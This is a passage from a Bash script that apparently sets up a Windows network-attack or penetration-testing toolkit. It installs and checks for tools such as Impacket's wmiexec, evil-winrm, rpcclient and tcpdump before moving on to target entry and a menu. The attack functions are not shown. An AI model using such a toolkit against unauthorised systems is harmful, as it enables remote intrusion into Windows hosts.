                for tool in "${manual_install[@]}"; do
                    if [ "$tool" = "pwsh" ]; then
                        echo -e "${YELLOW}[*] Installing PowerShell...${NC}"
                        echo -e "${YELLOW}[*] Downloading and installing from Microsoft repository...${NC}"
                        
                        # Download and install PowerShell package
                        PWSH_DEB=$(mktemp)
                        if wget -q https://github.com/PowerShell/PowerShell/releases/download/v7.4.0/powershell_7.4.0-1.deb_amd64.deb -O "$PWSH_DEB"; then
                            if sudo dpkg -i "$PWSH_DEB"; then
                                echo -e "${GREEN}[+] PowerShell installed successfully${NC}"
                            else
                                echo -e "${YELLOW}[*] Fixing dependencies...${NC}"
                                sudo apt-get install -f -y
                            fi
                            rm -f "$PWSH_DEB"
                        else
                            echo -e "${RED}[!] Failed to download PowerShell${NC}"
                            echo -e "${YELLOW}[*] Install manually:${NC}"
                            echo "  wget https://github.com/PowerShell/PowerShell/releases/download/v7.4.0/powershell_7.4.0-1.deb_amd64.deb"
                            echo "  sudo dpkg -i powershell_7.4.0-1.deb_amd64.deb"
                            echo "  sudo apt-get install -f"
                        fi
                    elif [ "$tool" = "impacket" ]; then
                        echo -e "${YELLOW}[*] Installing Impacket suite via pip...${NC}"
                        if ! command -v pip3 >/dev/null 2>&1; then
                            echo -e "${YELLOW}[*] Installing python3-pip first...${NC}"
                            sudo apt install -y python3-pip
                        fi
                        if sudo pip3 install impacket --break-system-packages; then
                            echo -e "${GREEN}[+] Impacket installed successfully${NC}"
                        else
                            echo -e "${RED}[!] Failed to install Impacket${NC}"
                            echo -e "${YELLOW}[*] Try manually: pip3 install impacket${NC}"
                        fi
                    fi
                done
            fi
            
            # Verify installation
            echo -e "${YELLOW}[*] Verifying installation...${NC}"
            local still_missing=()
            for tool in "${missing_tools[@]}"; do
                case $tool in
                    "smbclient")
                        command -v smbclient >/dev/null 2>&1 || still_missing+=("smbclient")
                        ;;
                    "rpcclient")
                        command -v rpcclient >/dev/null 2>&1 || still_missing+=("rpcclient")
                        ;;
                    "impacket")
                        command -v impacket-wmiexec >/dev/null 2>&1 || still_missing+=("impacket")
                        ;;
                    "xfreerdp")
                        command -v xfreerdp >/dev/null 2>&1 || still_missing+=("xfreerdp")
                        ;;
                    "evil-winrm")
                        command -v evil-winrm >/dev/null 2>&1 || still_missing+=("evil-winrm")
                        ;;
                    "tcpdump")
                        command -v tcpdump >/dev/null 2>&1 || still_missing+=("tcpdump")
                        ;;
                    "pwsh")
                        command -v pwsh >/dev/null 2>&1 || still_missing+=("pwsh")
                        ;;
                esac
            done
            
            if [ ${#still_missing[@]} -eq 0 ]; then
                echo -e "${GREEN}[+] All tools successfully installed${NC}"
            else
                echo -e "${RED}[!] Failed to install: ${still_missing[*]}${NC}"
                read -p "Continue anyway? (y/n): " continue_choice
                if [ "$continue_choice" != "y" ] && [ "$continue_choice" != "Y" ]; then
                    exit 1
                fi
            fi
        else
            read -p "Continue without installing? (y/n): " continue_choice
            if [ "$continue_choice" != "y" ] && [ "$continue_choice" != "Y" ]; then
                exit 1
            fi
        fi
    else
        echo -e "${GREEN}[+] All required tools found${NC}"
    fi
}

# Main execution
print_banner

# Parse command line arguments
parse_arguments "$@"

check_requirements
get_target_info
main_menu
